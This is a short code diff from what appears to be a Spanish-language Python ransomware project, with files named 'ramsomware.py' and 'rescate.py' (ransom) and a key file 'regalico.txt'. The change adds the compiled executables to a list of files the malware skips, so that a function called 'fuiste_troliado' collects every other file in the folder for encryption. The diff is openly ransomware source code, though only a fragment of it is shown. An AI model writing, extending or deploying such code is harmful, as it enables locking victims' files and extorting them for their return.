@@ -9,6 +9,11 @@ NOMBRE_LLAVE = "regalico.txt"
 NOMBRE_FICHERO = "ramsomware.py"
 NOMBRE_RESCATE = "rescate.py"
 
+EJECUTABLE_ATAQUE = "ramsomware.exe"
+EJECUTABLE_RESCATE = "rescate.exe"
+
+wanted_files = [NOMBRE_FICHERO, NOMBRE_LLAVE, NOMBRE_RESCATE, EJECUTABLE_ATAQUE, EJECUTABLE_RESCATE]
+
 
 def encrypt_files(fichericos, key):
 	for ficherico in fichericos:
@@ -27,7 +32,7 @@ def fuiste_troliado():
 
 	files = []
 	for file in os.listdir():
-		if file == "ramsomware.py" or file == "regalico.txt" or file == "rescate.py":
+		if file in wanted_files:
 			continue
 		files.append(file)
 
